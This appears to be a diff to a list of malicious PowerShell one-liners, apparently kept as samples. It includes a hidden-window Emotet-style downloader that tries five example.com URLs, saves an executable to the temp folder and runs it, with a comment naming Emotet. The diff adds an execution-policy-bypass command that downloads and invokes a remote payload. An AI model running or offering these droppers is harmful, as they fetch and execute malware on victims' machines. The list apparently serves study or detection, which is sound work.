@@ -2,4 +2,5 @@ powershell.exe -WindowStyle Hidden -noprofile If (test-path $env:APPDATA + '\pay
 
 powershell -WindowStyle Hidden $wscript = new-object -ComObject WScript.Shell;$webclient = new-object System.Net.WebClient;$random = new-object random;$urls = 'http://example.com/rwibpm/,http://example.com/awhwgra/,http://example.com/ev/,http://example.com/ckgawd/,http://example.com/kukajweln/'.Split(',');$name = $random.next(1, 65536);$path = $env:temp + '\' + $name + '.exe';foreach($url in $urls){try{$webclient.DownloadFile($url.ToString(), $path);Start-Process $path;break;}catch{write-host $_.Exception.Message;}}   //This is from the popular emotet. It downloads the trojan from 5 different URLs, saves it in the temp directory using a randomly generated numerical name, and then executes it.
 
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Exec Bypass -NoP -NoExit -Command iex((New-Object System.Net.WebClient).DownloadString('http://example.com/payload.exe'))
 
